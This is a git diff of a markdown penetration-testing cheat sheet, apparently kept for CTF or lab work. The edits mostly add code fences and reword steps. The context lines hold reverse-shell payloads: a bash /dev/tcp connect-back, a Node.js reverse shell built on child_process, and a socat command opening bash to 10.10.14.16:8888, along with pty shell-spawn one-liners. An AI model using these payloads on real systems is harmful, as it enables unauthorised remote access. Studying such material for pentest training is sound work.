@@ -327,6 +327,7 @@ p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while rea
 p.waitFor()
 ```
 #### NODE JS
+``` 
 (function(){
     var net = require("net"),
         cp = require("child_process"),
@@ -339,7 +340,7 @@ p.waitFor()
     });
     return /a/; // Prevents the Node.js application form crashing
 })();
-
+``` 
 ### SPAWN A SHELL
 
 #### BASH
@@ -374,7 +375,7 @@ perl: exec "/bin/sh";
 
 #### PYTHON
 Enter while in reverse shell
-`$ python -c 'import pty; pty.spawn("/bin/bash")'`
+`python -c 'import pty; pty.spawn("/bin/bash")'`
 
 #### SOCAT
 ```
@@ -391,7 +392,7 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.16:8888
 {SEARCHSPLOIT / EXPLOIT-DB}
 {METASPLOIT}
 
-[REPEAT UNTIL...]
+[REPEAT 6+7 UNTIL...]
 
 ## N) POST EXPLOTATION / PRIVILEGE ESCALATION (USER ROOT/ADMIN)
 
